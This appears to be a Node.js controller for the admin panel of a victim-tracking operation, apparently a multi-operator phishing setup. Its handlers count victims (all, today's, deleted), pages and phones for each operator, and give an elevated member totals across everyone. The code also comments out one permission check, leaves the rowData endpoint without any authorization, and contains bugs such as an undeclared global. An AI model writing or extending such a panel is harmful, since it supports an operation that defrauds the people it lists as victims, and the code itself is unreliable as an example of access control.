const { users, victims, page, phone } = require("../model");
const today = require("../config/date");
const httperror = require("http-errors");

module.exports = {
  getUsers: async (req, res, next) => {
    try {
      let params = req.params;
      let query;
      if (params.id) {
        // if (parseInt(params.id) != req.user.id) {
        //   throw httperror.Forbidden("not permission user");
        // }
        query = await users.findOne({
          where: { id: params.id, block: 0 },
          attributes: { exclude: ["password", "email", "ip", "member"] },
          // include: [{ model: victims, where: { userId: 1 } }],
        });
      } else {
        if (req.user.id != 1) {
          throw httperror.Forbidden("not permission user");
        }
        query = await users.findAll({
          order: [["id", "DESC"]],
          attributes: { exclude: ["password", "email", "ip", "member"] },
        });
      }
      res.send(query);
    } catch (err) {
      next(err);
    }
  },

  dashBoard: async (req, res, next) => {
    try {
      if (parseInt(req.params.id) != req.user.id) {
        throw httperror.Forbidden("not permission user");
      }
      let checkuser = await users.findAll({
        where: { id: req.params.id, block: 0 },
      });
      let victimall;
      let victimdel;
      let victimday;
      let allpage;
      let allphone;

      victimall = await victims.findAll({
        where: { userId: req.params.id, delete: 0 },
      });
      allphone = await phone.findAll();
      allpage = await page.findAll({
        where: { userId: req.params.id, delete: 0 },
      });
      victimdel = await victims.findAll({
        where: { userId: req.params.id, delete: 1 },
      });
      victimday = await victims.findAll({
        where: { userId: req.params.id, delete: 0, date: today },
      });
      if (checkuser[0].member == 1) {
        usserss = await users.findAll();
        victimall = await victims.findAll({
          where: { delete: 0 },
        });
        victimdel = await victims.findAll({
          where: { delete: 1 },
        });
        victimday = await victims.findAll({
          where: { delete: 0, date: today },
        });
        allpage = await page.findAll({
          where: { delete: 0 },
        });
      } else {
        usserss = 0;
      }
      Promise.all([victimall, victimday, victimdel, usserss, allpage, allphone])
        .then((responses) => {
          console.log("**********COMPLETE RESULTS****************");
          console.log(responses[0].length);
          console.log(responses[1].length);
          console.log(responses[2].length);
          res.json({
            allvictims: responses[0].length,
            todayvictims: responses[1].length,
            deleted: responses[2].length,
            users: responses[3].length,
            pages: responses[4].length,
            phones: responses[5].length,
          });
        })
        .catch((err) => {
          console.log("**********ERROR RESULT****************");
          console.log(err);
        });
    } catch (error) {
      res.json({ error });
    }
  },
  /// all data
  rowData: async (req, res, next) => {
    try {
      let victimall;
      let victimdel;
      let victimday;
      let allpage;
      let allphone;

      usserss = await users.findAll();
      victimall = await victims.findAll({
        where: { delete: 0 },
      });
      victimdel = await victims.findAll({
        where: { delete: 1 },
      });
      victimday = await victims.findAll({
        where: { delete: 0, date: today },
      });
      allpage = await page.findAll({
        where: { delete: 0 },
      });
      allphone = await phone.findAll();

      res.json({
        allvictims: victimall.length,
        todayvictims: victimday.length,
        deleted: victimdel.length,
        users: usserss.length,
        pages: allpage.length,
        phones: allphone.length,
      });
    } catch (error) {
      res.json({ error });
    }
  },
  updateUsers: async (req, res, next) => {
    try {
      if (parseInt(req.params.id) != req.user.id) {
        throw httperror.Forbidden("not permission user");
      }
      let checkuser = await users.findAll({
        where: { id: req.params.id, block: 0 },
      });
      if (checkuser.length > 0) {
        if (req.body.email != "" && req.body.country != "") {
          await users
            .update(
              {
                email: req.body.email,
                country: req.body.country,
              },
              { where: { id: req.params.id } }
            )
            .then((resp) => {
              res
                .json({
                  message: " successfully update info",
                })
                .catch((err) => {
                  res.json({
                    message: " error update try agian",
                  });
                });
            });
        } else {
          res.json({
            message: " error data is empty",
          });
        }
      }
    } catch (error) {
      next(error.message);
    }
  },
};
